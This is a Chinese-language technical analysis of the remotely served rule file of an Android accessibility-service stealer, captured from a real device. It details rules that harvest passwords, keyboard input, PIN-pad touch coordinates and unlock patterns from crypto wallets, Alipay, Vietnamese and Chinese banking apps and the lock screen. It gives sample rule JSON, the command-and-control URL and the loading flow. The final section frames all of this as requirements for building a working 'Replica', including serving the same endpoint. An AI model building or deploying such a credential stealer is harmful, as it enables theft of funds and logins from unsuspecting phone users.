# listenWindows.json 真机抓取分析

> 抓取日期: 2026-03-21
> 设备: 华为 FIN-AL60 (192.168.31.162:5555)
> Vendor APK: stripchat-release.apk (包名: org.ldtape.qqlhl)
> 文件路径: /storage/emulated/0/Android/data/org.ldtape.qqlhl/files/listenWindows.json
> 原始数据: [listenWindows.json](./listenWindows.json) (3881 行, 46KB)

## 概述

| 指标 | 值 |
|------|-----|
| 总规则数 | 55 |
| 总 EventSubscribe 数 | 63 |
| 目标应用数 | 20 个包名 |
| listenType 种类 | 6 种 |
| eventType 种类 | 9 种 |

## 远程拉取地址

```
GET https://api.rathat.live/api/listen/windows.json
    ?deviceId={deviceId}
    &langCode={langCode}
    &containerCode=ACCESSIBILITY_CONTAINER
```

## listenType 含义

| listenType | 含义 | 规则数 | 说明 |
|------------|------|--------|------|
| 0 | 通用监听 | 4 | 通用窗口事件处理 |
| 1 | 窗口状态 | 5 | 监听窗口打开/关闭/切换 |
| 3 | 手势采集 | 6 | 采集手势轨迹 (GESTURE_POINTS / TOUCH_POINT) |
| 8 | 键盘/输入 | 21 | 监听软键盘输入内容 |
| 9 | 点击采集 | 6 | 采集用户点击坐标 |
| 12 | 密码输入 | 13 | 专门监听密码框输入 |

## eventType 含义

| eventType | 常量名 | 说明 |
|-----------|--------|------|
| 1 | TYPE_VIEW_CLICKED | 控件被点击 |
| 8 | TYPE_VIEW_FOCUSED | 控件获得焦点 |
| 16 | TYPE_VIEW_TEXT_CHANGED | 文本内容变化 |
| 32 | TYPE_WINDOW_CONTENT_CHANGED | 窗口内容变化 |
| 2048 | TYPE_WINDOW_STATE_CHANGED | 窗口状态变化 (Activity 切换) |
| 8192 | TYPE_VIEW_TEXT_SELECTION_CHANGED | 文本选区变化 |
| 16384 | TYPE_VIEW_SCROLLED | 滚动事件 |
| 32768 | TYPE_ANNOUNCEMENT | 无障碍公告 |
| 4194304 | TYPE_WINDOWS_CHANGED | 窗口列表变化 |

## 目标应用分类

### 加密货币钱包 (14 个应用, 39 条规则)

| 包名 | 应用名 | 规则数 | 监听类型 |
|------|--------|--------|----------|
| im.token.app | imToken | 5 | 手势采集 + 密码输入 + 键盘输入 + 点击采集 |
| com.wallet.crypto.trustapp | Trust Wallet | 3 | 密码输入 + 键盘输入 |
| io.metamask | MetaMask | 3 | 键盘输入 + 密码输入 + 点击采集 |
| com.okinc.okex.gp | OKX | 3 | 密码输入 + 键盘输入 + 点击采集 |
| com.bitkeep.wallet | Bitget Wallet | 3 | 手势采集 + 键盘输入 + 点击采集 |
| org.toshi | Coinbase Wallet | 3 | 手势采集 + 键盘输入 + 点击采集 |
| com.ton_keeper | Tonkeeper | 2 | 手势采集 + 键盘输入 |
| com.solflare.mobile | Solflare | 2 | 手势采集 + 键盘输入 |
| com.kubi.kucoin | KuCoin | 2 | 密码输入 + 键盘输入 |
| com.mycelium.wallet | Mycelium | 2 | 密码输入 + 键盘输入 |
| com.myetherwallet.mewwallet | MEW Wallet | 2 | 密码输入 + 键盘输入 |
| vip.mytokenpocket | TokenPocket | 2 | 键盘输入 + 密码输入 |
| com.bitpie | Bitpie | 2 | 密码输入 + 键盘输入 |
| com.defi.wallet | Crypto.com DeFi | 2 | 密码输入 + 键盘输入 |

### 银行/支付应用 (4 个应用, 8 条规则)

| 包名 | 应用名 | 规则数 | 监听类型 |
|------|--------|--------|----------|
| com.eg.android.AlipayGphone | 支付宝 | 3 | 密码输入 + 点击采集 + 键盘输入 |
| com.chinamworld.main | 建设银行 | 4 | 窗口状态 + 手势采集 + 键盘输入 |
| com.mservice.momotransfer | MoMo (越南) | 2 | 密码输入 + 键盘输入 |
| vn.com.vng.zalopay | ZaloPay (越南) | 2 | 密码输入 + 键盘输入 |

### 系统组件 (2 个, 8 条规则)

| 包名 | 应用名 | 规则数 | 监听类型 |
|------|--------|--------|----------|
| com.android.systemui | 系统 UI | 7 | 窗口状态 + 通用监听 (锁屏密码采集) |
| com.android.settings | 系统设置 | 1 | 通用监听 |

## helperProp 采集方式

| helperProp | 含义 | 使用场景 |
|------------|------|----------|
| TOUCH_POINT | 单点触摸坐标 | PIN 码数字键盘点击位置推断 |
| GESTURE_POINTS | 手势轨迹点序列 | 图案解锁轨迹采集 |

## 典型规则结构示例

### 示例 1: imToken 手势采集 (listenType=3)

```json
{
  "id": "804776283977179136",
  "packageName": "im.token.app",
  "className": "",
  "listenType": 3,
  "orderNo": 0,
  "matchs": [
    {
      "intConditions": [{"compare":"EQUALS","filterKey":"childCount","filterValue":9}],
      "target": 0
    },
    {
      "stringConditions": [{"equals":"android.view.ViewGroup","property":"className"}],
      "target": 0
    }
  ],
  "eventSubscribes": [{
    "id": "804779153518653440",
    "listenId": "804776283977179136",
    "eventTypes": [32, 4194304, 2048],
    "listenType": 3,
    "listenHelper": true,
    "helperProp": "GESTURE_POINTS",
    "listenProps": ["boundsInParent", "boundsInScreen", "GESTURE_POINTS"],
    "combineFilter": {
      "intConditions": [{"compare":"EQUALS","filterKey":"childCount","filterValue":9}],
      "stringConditions": [{"equals":"android.view.ViewGroup","property":"className"}]
    }
  }]
}
```

解读: 匹配 imToken 中 childCount=9 的 ViewGroup (3x3 九宫格), 采集手势轨迹点。

### 示例 2: MetaMask 密码输入 (listenType=12)

```json
{
  "id": "781706904708472832",
  "packageName": "io.metamask",
  "className": "io.metamask.MainActivity",
  "listenType": 12,
  "orderNo": 20,
  "matchs": [
    {
      "boolConditions": [{"filterKey":"password","filterValue":true}],
      "target": 0
    },
    {
      "stringConditions": [{"equals":"android.widget.EditText","property":"className"}],
      "target": 0
    }
  ],
  "eventSubscribes": [{
    "eventTypes": [16, 8192],
    "listenType": 12,
    "listenProps": ["text"],
    "combineFilter": {
      "boolConditions": [{"filterKey":"password","filterValue":true}],
      "stringConditions": [{"equals":"android.widget.EditText","property":"className"}]
    }
  }]
}
```

解读: 匹配 MetaMask 中 password=true 的 EditText, 监听 text 属性变化采集密码。

### 示例 3: 支付宝密码采集 (listenType=12, TOUCH_POINT)

```json
{
  "id": "808413413543337984",
  "packageName": "com.eg.android.AlipayGphone",
  "className": "",
  "listenType": 12,
  "orderNo": 91,
  "eventSubscribes": [{
    "eventTypes": [32, 2048, 16384],
    "listenHelper": true,
    "helperProp": "TOUCH_POINT",
    "listenProps": ["text", "boundsInScreen", "TOUCH_POINT"],
    "combineFilter": {
      "stringConditions": [
        {"equals":"android.widget.LinearLayout","property":"className"},
        {"contains":"com.alipay.android.phone.mobilecommon.verifyidentity","property":"id"}
      ]
    }
  }]
}
```

解读: 匹配支付宝身份验证页面的数字键盘, 通过 TOUCH_POINT 坐标推断按下的数字。

## CombineFilter 条件类型

### stringConditions

| 属性 | 匹配方式 | 说明 |
|------|----------|------|
| className | equals | 精确匹配控件类名 |
| text | contains / equals / regex | 匹配控件文本 |
| id | contains / equals | 匹配 resource-id |
| contentDescription | contains | 匹配内容描述 |
| property | prefix | 前缀匹配 |

### intConditions

| 属性 | 比较方式 | 说明 |
|------|----------|------|
| childCount | EQUALS | 子节点数量 (如九宫格=9) |

### boolConditions

| 属性 | 说明 |
|------|------|
| password | 是否为密码输入框 |
| clickable | 是否可点击 |
| checkable | 是否可选中 |
| scrollable | 是否可滚动 |

## 规则优先级 (orderNo)

```
0-10:   高优先级 — imToken, 系统 UI 锁屏
12-20:  中高优先级 — OKX 点击, MetaMask, Trust Wallet
21-53:  中优先级 — 各钱包键盘输入
65-79:  中低优先级 — Tonkeeper, Solflare, Bitget, Coinbase
91-94:  低优先级 — 支付宝
100-161: 较低优先级 — KuCoin, Mycelium, MEW, TokenPocket, OKX, CCB, Bitpie, DeFi
190-201: 最低优先级 — MoMo, ZaloPay
```

## 加载流程 (vendor 源码)

```
onServiceConnected → j0()
  ├─ d0() 加载本地缓存
  │   ├─ g.i0() → externalFilesDir
  │   ├─ 读取 {externalFilesDir}/listenWindows.json
  │   ├─ g.G(json) → 反序列化 List<ListenWindow>
  │   │   └─ g.H(list) → 排序 + 注册到 AccessibilityDelegateManager
  │   └─ F(2) → f226k 累加
  │
  └─ l.d() 远程拉取
      ├─ GET https://api.rathat.live/api/listen/windows.json
      ├─ m.d() 回调 → 写入本地文件
      └─ F(1) → f226k 累加 ≥2 → "LOAD_LISTEN_WINDOW_FINISHED"
```

## 对 Replica 实现的意义

1. **V2 平台需要实现 `/api/listen/windows.json` 接口** — 返回与此文件相同结构的 JSON
2. **listenWindows 是服务端动态下发的** — 可以按设备/语言/场景灵活配置规则
3. **Replica 的 `MyAccessibilityService.d0()` 已实现加载逻辑** — 只需服务端下发数据即可工作
4. **`m.java` (ListenWindowCallback) 需要完善解析和写入逻辑** — 当前是空实现
